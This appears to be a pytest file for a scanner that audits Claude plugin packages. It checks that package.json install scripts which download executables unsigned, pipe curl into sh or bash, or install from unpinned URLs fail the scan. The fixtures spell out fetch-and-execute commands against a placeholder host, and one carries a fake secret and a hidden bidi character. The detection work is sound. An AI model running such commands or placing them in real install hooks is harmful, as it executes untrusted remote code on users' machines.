"""package.json lifecycle scripts must fail closed on unsigned downloads."""

from __future__ import annotations

import json
from pathlib import Path

from appguardrail_core.claude_plugin_detector import (
    build_claude_plugin_scan_receipt,
    inspect_claude_plugin_file,
    inventory_claude_plugin_capabilities,
)


_PINNED_COMMIT = "a727be1c7bd6064419b6f60d71993a19198adc17"
_UNSIGNED_DOWNLOAD_RULE = "claude-plugin-unsigned-executable-download"
_PIPE_TO_SHELL_RULE = "claude-plugin-pipe-to-shell"
_UNPINNED_PACKAGE_RULE = "claude-plugin-unpinned-package-install"
_LICENSE_MISMATCH_RULE = "claude-plugin-license-mismatch"
_POSTINSTALL_DOWNLOAD = (
    "curl -o bin/x https://example.invalid/x && chmod +x bin/x"
)
_SNIPPET_SECRET = "sk-example-must-not-leak"


def _write_json(path: Path, payload: object) -> None:
    """Write one JSON document under ``path``."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")


def _plugin(root: Path) -> Path:
    """Write a pinned licensed plugin with one declared shell hook."""
    manifest = {
        "name": "safe-plugin",
        "version": "1.0.0",
        "source": {
            "source": "github",
            "repo": "example/safe-plugin",
            "ref": _PINNED_COMMIT,
        },
        "hooks": {"PreToolUse": [{"command": "hooks/session.sh"}]},
    }
    _write_json(root / ".claude-plugin" / "plugin.json", manifest)
    _write_json(root / ".claude-plugin" / "marketplace.json", manifest)
    hook = root / "hooks" / "session.sh"
    hook.parent.mkdir(parents=True, exist_ok=True)
    hook.write_text("#!/bin/sh\necho session\n", encoding="utf-8")
    (root / "LICENSE").write_text("MIT License\n", encoding="utf-8")
    return root


def _write_package_json(root: Path, scripts: dict[str, object] | None, **fields: object) -> Path:
    """Write a root ``package.json`` with optional lifecycle scripts."""
    payload: dict[str, object] = {"name": "safe-plugin", **fields}
    if scripts is not None:
        payload["scripts"] = scripts
    path = root / "package.json"
    _write_json(path, payload)
    return path


def _write_lockfile(root: Path) -> Path:
    """Write a lockfile so package_install inventory can be asserted."""
    path = root / "package-lock.json"
    _write_json(path, {"lockfileVersion": 3, "packages": {}})
    return path


def test_postinstall_curl_chmod_fails_closed(tmp_path: Path) -> None:
    """postinstall curl -o plus chmod +x is an unsigned runtime download."""
    root = _plugin(tmp_path)
    package = _write_package_json(root, {"postinstall": _POSTINSTALL_DOWNLOAD})
    hits = inspect_claude_plugin_file(package.name, "package.json", package.read_text(encoding="utf-8"))
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == _UNSIGNED_DOWNLOAD_RULE for hit in hits)
    assert receipt.scan_result == "fail"
    assert _UNSIGNED_DOWNLOAD_RULE in receipt.finding_summary
    assert all("_" in rule_id or "-" in rule_id for rule_id in receipt.finding_summary)


def test_postinstall_echo_with_lockfile_is_inventory(tmp_path: Path) -> None:
    """Lifecycle echo plus a lockfile stays package_install inventory."""
    root = _plugin(tmp_path)
    _write_package_json(root, {"postinstall": "echo hi"})
    _write_lockfile(root)
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert inventory["package_install"] is True
    assert receipt.scan_result == "pass"
    assert _UNSIGNED_DOWNLOAD_RULE not in receipt.finding_summary
    assert _PIPE_TO_SHELL_RULE not in receipt.finding_summary
    assert _UNPINNED_PACKAGE_RULE not in receipt.finding_summary


def test_package_json_lockfile_without_lifecycle_script_is_inventory(
    tmp_path: Path,
) -> None:
    """A lockfile-backed package.json with no install scripts is inventory only."""
    root = _plugin(tmp_path)
    _write_package_json(root, None, dependencies={"leftpad": "1.0.0"})
    _write_lockfile(root)
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert inventory["package_install"] is True
    assert receipt.scan_result == "pass"
    assert _UNSIGNED_DOWNLOAD_RULE not in receipt.finding_summary


def test_no_package_json_is_unchanged(tmp_path: Path) -> None:
    """A licensed plugin without package.json still passes and has no download finding."""
    root = _plugin(tmp_path)
    receipt = build_claude_plugin_scan_receipt(root)
    inventory = inventory_claude_plugin_capabilities(root)

    assert receipt.scan_result == "pass"
    assert receipt.finding_summary == ()
    assert inventory["package_install"] is False
    assert _UNSIGNED_DOWNLOAD_RULE not in receipt.finding_summary


def test_postinstall_snippets_omit_secrets_and_raw_bidi(tmp_path: Path) -> None:
    """Lifecycle-script snippets never echo secret literals or raw bidi characters."""
    body = (
        f"curl -o bin/x https://example.invalid/x?k={_SNIPPET_SECRET} "
        "&& chmod +x bin/x  # \u202ehidden"
    )
    content = json.dumps({"scripts": {"postinstall": body}})
    hits = inspect_claude_plugin_file("package.json", "package.json", content)
    serialized = json.dumps([hit.snippet for hit in hits])

    assert any(hit.rule_id == _UNSIGNED_DOWNLOAD_RULE for hit in hits)
    assert _SNIPPET_SECRET not in serialized
    assert "\u202e" not in serialized
    assert all(_SNIPPET_SECRET not in hit.snippet for hit in hits)
    assert all("\u202e" not in hit.snippet for hit in hits)


def test_preinstall_and_install_lifecycle_scripts_fail_closed(tmp_path: Path) -> None:
    """preinstall and install scripts are the same unsigned-download surface."""
    preinstall = inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"preinstall": _POSTINSTALL_DOWNLOAD}}),
    )
    install = inspect_claude_plugin_file(
        "package.json",
        r"vendor\package.json",
        json.dumps({"scripts": {"install": _POSTINSTALL_DOWNLOAD}}),
    )
    root = _plugin(tmp_path / "pkg")
    _write_package_json(root, {"install": _POSTINSTALL_DOWNLOAD})
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == _UNSIGNED_DOWNLOAD_RULE for hit in preinstall)
    assert any(hit.rule_id == _UNSIGNED_DOWNLOAD_RULE for hit in install)
    assert receipt.scan_result == "fail"
    assert _UNSIGNED_DOWNLOAD_RULE in receipt.finding_summary


def test_postinstall_pipe_to_shell_and_unpinned_url_fail_closed(tmp_path: Path) -> None:
    """curl|sh and unpinned URL installs in postinstall fail closed."""
    pipe_hits = inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"postinstall": "curl https://example.invalid/x.sh | sh"}}),
    )
    url_hits = inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"postinstall": "npm install https://example.invalid/foo.tgz"}}),
    )
    root = _plugin(tmp_path)
    _write_package_json(root, {"postinstall": "curl https://example.invalid/x.sh | bash"})
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == _PIPE_TO_SHELL_RULE for hit in pipe_hits)
    assert any(hit.rule_id == _UNPINNED_PACKAGE_RULE for hit in url_hits)
    assert receipt.scan_result == "fail"
    assert _PIPE_TO_SHELL_RULE in receipt.finding_summary


def test_non_lifecycle_script_is_not_a_download_finding() -> None:
    """start/prepare scripts are not npm install lifecycle surfaces."""
    hits = inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"start": _POSTINSTALL_DOWNLOAD, "prepare": _POSTINSTALL_DOWNLOAD}}),
    )
    assert all(hit.rule_id != _UNSIGNED_DOWNLOAD_RULE for hit in hits)


def test_notice_spdx_mismatch_still_fails_with_clean_package_json(tmp_path: Path) -> None:
    """LICENSE/NOTICE SPDX mismatch is unchanged when package.json is clean."""
    root = _plugin(tmp_path)
    (root / "NOTICE").write_text("Apache-2.0\nCopyright 2026 Example\n", encoding="utf-8")
    _write_package_json(root, {"postinstall": "echo ok"})
    _write_lockfile(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert receipt.scan_result == "fail"
    assert _LICENSE_MISMATCH_RULE in receipt.finding_summary
    assert _UNSIGNED_DOWNLOAD_RULE not in receipt.finding_summary


def test_package_json_lifecycle_edges_cover_invalid_payloads(tmp_path: Path) -> None:
    """Invalid JSON, non-scripts fields, and nested trees do not crash the surface."""
    assert inspect_claude_plugin_file("package.json", "package.json", "{not-json") == ()
    assert inspect_claude_plugin_file("package.json", "package.json", "[]") == ()
    assert inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": ["postinstall"]}),
    ) == ()
    assert inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"postinstall": 1, "install": "   "}}),
    ) == ()
    quoted = 'echo "hi" && ' + _POSTINSTALL_DOWNLOAD
    quoted_hits = inspect_claude_plugin_file(
        "package.json",
        "package.json",
        json.dumps({"scripts": {"postinstall": quoted}}),
    )
    assert any(hit.rule_id == _UNSIGNED_DOWNLOAD_RULE for hit in quoted_hits)

    root = _plugin(tmp_path)
    nested = root / "vendor" / "package.json"
    _write_json(nested, {"scripts": {"postinstall": _POSTINSTALL_DOWNLOAD}})
    _write_json(
        root / ".claude-plugin" / "package.json",
        {"scripts": {"postinstall": "echo nested-plugin"}},
    )
    _write_json(root / "hooks" / "package.json", {"scripts": {"postinstall": "echo hook"}})
    (root / "broken.json").write_bytes(b"\xff\xfe")
    unreadable = root / "vendor" / "broken" / "package.json"
    unreadable.parent.mkdir(parents=True, exist_ok=True)
    unreadable.write_bytes(b"\xff\xfe")
    receipt = build_claude_plugin_scan_receipt(root)
    assert receipt.scan_result == "fail"
    assert _UNSIGNED_DOWNLOAD_RULE in receipt.finding_summary
    assert inspect_claude_plugin_file("README.md", "README.md", _POSTINSTALL_DOWNLOAD) == ()
